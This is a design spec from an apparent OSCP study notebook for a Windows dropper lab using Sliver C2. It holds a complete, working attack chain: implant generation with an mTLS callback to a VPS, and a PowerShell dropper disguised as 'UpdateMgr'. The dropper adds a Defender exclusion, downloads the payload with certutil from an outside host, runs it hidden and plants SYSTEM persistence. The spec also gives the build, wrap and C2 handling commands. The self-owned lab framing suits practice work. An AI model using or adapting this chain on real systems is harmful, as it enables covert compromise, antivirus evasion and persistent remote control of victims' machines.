---
title: 2026-08-13-windows-dropper-design
type: note
permalink: oscp/docs/superpowers/specs/2026-08-13-windows-dropper-design
---

# Windows Dropper Lab — Design Spec

**Date:** 2026-08-13
**Status:** Approved by user, revised for Sliver C2, awaiting spec review
**Goal:** One double-clickable exe that gets a reverse shell from a Windows VM back to the VPS, plants persistence, and survives Windows Defender — all in a self-owned lab. Shells are caught and managed by **Sliver C2** (many sessions at once, encrypted, self-reconnecting), not plain nc.

## Context and constraints

- **Target:** user's own Windows VM (eval VM, NAT networking, Windows Firewall + Defender on).
- **Attacker:** user's VPS at `2.25.141.57` (reachable via Tailscale as `100.125.52.98`; hostname `hermes-vps`). x86_64, 31GB RAM. Has `python3`, `nc`, and now **sliver-server v1.7.3** at `~/sliver/sliver-server` (initialized, `~/.sliver` unpacked). No msfvenom — not needed anymore.
- **Callback:** port `443` (outbound-friendly). Requires the one-time `setcap` command so sliver-server can bind 443 without root.
- **One port, many VMs:** implants are distinguished by source connection + Sliver's per-implant crypto IDs. No per-VM ports needed.
- **Payload transport/storage:** private GitHub repo `git@github.com:JasonSonith/payloads.git` (verified private, VPS authenticates to GitHub as JasonSonith). Cloned at `~/payloads` on the VPS, served by `python3 -m http.server 80`.
- **Build machines:** implant is compiled **on the VPS** by sliver-server. Only the dropper wrap (PS2EXE) needs the Windows machine. Kali/WSL no longer needed for building.
- User runs the dropper interactively in the VM and will click **Yes** at the UAC prompt.
- **Explicitly skipped:** the manual nc + PowerShell one-liner pre-test. If the chain fails, that test becomes the first debug step to split "network problem" from "payload problem."

## Architecture

```
VPS: sliver-server ──generate──> updater.exe ──> ~/payloads ──git push──> GitHub (private, backup)
                                     │
                          python3 -m http.server 80 (serves ~/payloads)
                                     │
Windows ──PS2EXE────> UpdateMgr.exe (dropper, built once)
                                     │
Windows VM: double-click UpdateMgr.exe → UAC → exclusion → certutil download ──┘
           → run payload → implant calls home ──mTLS──> sliver-server :443 (session, admin user)
           → scheduled task → implant runs at boot → new session as SYSTEM
```

Two files:

| File | Role | Built with | Where |
|---|---|---|---|
| `updater.exe` | Sliver implant (payload) | sliver-server `generate` (on VPS) | `~/payloads` on VPS |
| `UpdateMgr.exe` | Dropper (wrapper) | PS2EXE (Windows) | double-clicked in VM |

The dropper must look boring to Defender — it only runs ordinary commands. The spicy payload downloads *after* the exclusion exists.

## Build order

1. **VPS:** clone repo, open firewall, start `http.server` (Component 3). Run the one-time `setcap` for port 443.
2. **VPS:** start `sliver-server`, start the mTLS listener, `generate` the implant straight into `~/payloads`, rename to `updater.exe`. Optionally commit + push as a backup.
3. **Windows machine:** write `install.ps1` (keep the source in the payloads repo so it's versioned), wrap with PS2EXE → `UpdateMgr.exe`. Copy the exe into the VM (shared folder / clipboard / drag-drop).
4. **Windows VM:** run `UpdateMgr.exe`, follow the test plan.

## Component 1 — `updater.exe` (Sliver implant)

Generated inside the sliver-server console on the VPS:

```
generate --mtls 2.25.141.57:443 --os windows --arch amd64 --format exe --save /home/jason/payloads/
```

(Sliver prints a random filename; rename it to `updater.exe`. First generate compiles Go code — takes a minute or two, fine with 31GB RAM.)

- **mTLS** = encrypted channel where implant and server verify each other. Random internet scanners can't talk to your listener, and traffic isn't plaintext like nc.
- Session-mode implant (constant connection, interactive) for the first run — you see results immediately.
- Later experiment: **beacon** mode (`generate beacon ... --seconds 60 --jitter 30`) — checks in on a randomized interval instead of holding a connection. Matches the beacon/jitter concept in [[Windows Persistence Flow]].
- A Sliver implant can only be caught by sliver-server — `nc` cannot speak its protocol.

## Component 2 — `install.ps1` → `UpdateMgr.exe` (dropper)

Unchanged by the Sliver swap. Script (draft; implementation may refine):

```powershell
# UpdateMgr dropper - personal lab use only
$ErrorActionPreference = 'Stop'
$dir     = 'C:\ProgramData\Microsoft\UpdateMgr'
$payload = "$dir\updater.exe"
$vps     = '2.25.141.57'

try {
    Write-Host "[1/5] Adding Defender exclusion..."
    Add-MpPreference -ExclusionPath $dir

    Write-Host "[2/5] Creating folder..."
    New-Item -ItemType Directory -Path $dir -Force | Out-Null

    Write-Host "[3/5] Downloading payload..."
    certutil -urlcache -split -f "http://$vps/updater.exe" $payload | Out-Null
    if (-not (Test-Path $payload)) { throw "download failed - is http.server up on the VPS?" }

    Write-Host "[4/5] Running payload..."
    Start-Process $payload -WindowStyle Hidden

    Write-Host "[5/5] Planting persistence..."
    schtasks /create /tn "UpdateMgr" /tr $payload /sc onstart /ru SYSTEM /f | Out-Null

    Write-Host "Done. Session should appear in Sliver now, and after every reboot."
} catch {
    Write-Host "FAILED: $_"
    exit 1
}
```

Wrapped on the Windows machine:

```powershell
Install-Module ps2exe -Scope CurrentUser
Invoke-ps2exe -inputFile install.ps1 -outputFile UpdateMgr.exe -requireAdmin
```

- `-requireAdmin` embeds the manifest that makes Windows show the UAC prompt at launch. No self-relaunch logic needed in the script. Clicking **No** means nothing runs — acceptable in lab.
- Console stays visible so each step prints — fail loudly, not silently.

## Component 3 — VPS setup

```bash
# one-time
git clone git@github.com:JasonSonith/payloads.git ~/payloads
sudo setcap "cap_net_bind_service=+ep" /home/jason/sliver/sliver-server   # allows binding port 443 as user
sudo ufw allow 80 && sudo ufw allow 443                                   # if ufw is active (needs user password)

# every lab session — three terminals (e.g. tmux windows over SSH)
cd ~/payloads && python3 -m http.server 80   # 1: serves payloads
cd ~/sliver && ./sliver-server               # 2: the C2 console
```

Inside the sliver console:

```
mtls --lhost 0.0.0.0 --lport 443     # start the listener (shows under `jobs`)
sessions                             # list implants that called home
use <id>                             # pick one
shell                                # interactive cmd on that target
background                           # back to the session list
```

`nc -lvnp 443` remains only as the debug fallback (manual PowerShell one-liner test) — it can't catch Sliver implants.

## Persistence

`schtasks /create /tn "UpdateMgr" /tr C:\ProgramData\Microsoft\UpdateMgr\updater.exe /sc onstart /ru SYSTEM /f`

- Runs the implant at boot as SYSTEM. A new session appears in Sliver whenever the listener is up — no payload re-run needed.

## Error handling

- Per-step console output; script stops at the first failure with the step number visible.
- `Test-Path` guard after download catches the most likely failure (VPS http server not running).
- Known unscriptable failure: Defender flags the *dropper itself* on double-click (before any exclusion exists). Lab fix: temporarily exclude the VM's Downloads folder, verify mechanics, then remove it to study detection.
- If no session appears: check `jobs` in Sliver (listener actually running?), then run the manual nc test to isolate network vs payload.

## Test plan

1. VM browser → `http://2.25.141.57/updater.exe` downloads (proves network path; ignore SmartScreen warning).
2. Double-click `UpdateMgr.exe` → UAC Yes → steps 1-5 print → a new entry appears in Sliver's `sessions` as the admin user.
3. Reboot VM → a second session appears; `use` it, `shell`, `whoami` → `nt authority\system`.
4. On VM: `Get-MpPreference | Select-Object ExclusionPath` shows our folder; payload file untouched by Defender.
5. If anything fails: run the manual PowerShell one-liner from [[Reverse Shell]] against `nc -lvnp 443` to isolate network vs payload.

## Cleanup (keeps the VM reusable)

```powershell
schtasks /delete /tn "UpdateMgr" /f
Remove-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\UpdateMgr'
Remove-Item -Recurse -Force 'C:\ProgramData\Microsoft\UpdateMgr'
```

In Sliver: `sessions -k <id>` to kill a session; stop the listener job when done.

## Security notes

- While `http.server` runs on the public IP, anyone can download those files. Lab is short-lived; stop the server when done. (The Sliver listener itself is safe to leave up — mTLS means only your implants can use it.)
- Repo must stay **private** (verified: unauthenticated API returns 404). Public hosting of live implants invites scanner flagging and GitHub ToS problems.
- All targets are user-owned. Nothing here touches a third-party machine.

## Out of scope (YAGNI)

- AV evasion beyond the exclusion trick (obfuscation, AMSI bypass, crypters).
- Sliver multiplayer (multiple operators), redirectors, custom traffic encoders.
- Beacon mode for the *first* run — session mode first, beacon as the follow-up experiment.
- Bind shells, Linux targets.
